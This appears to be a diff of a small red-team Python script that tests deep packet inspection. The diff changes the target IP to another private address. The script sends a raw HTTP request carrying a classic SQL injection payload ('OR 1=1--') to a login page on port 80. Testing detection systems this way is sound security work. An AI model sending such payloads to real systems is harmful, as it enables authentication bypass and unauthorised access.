@@ -4,7 +4,7 @@ import time
 print("🔥 Initializing Red Team DPI Attack Vector...")
 time.sleep(1)
 
-target_ip = "192.168.1.109"  # <-- Make sure this is your local network IP
+target_ip = "192.168.100.1"  # <-- Make sure this is your local network IP
 target_port = 80           # Targeting HTTP port
 # Sending a classic SQL injection attempt
 payload_data = "GET /login.php?user=' OR 1=1-- HTTP/1.1\r\nHost: target\r\n\r\n"
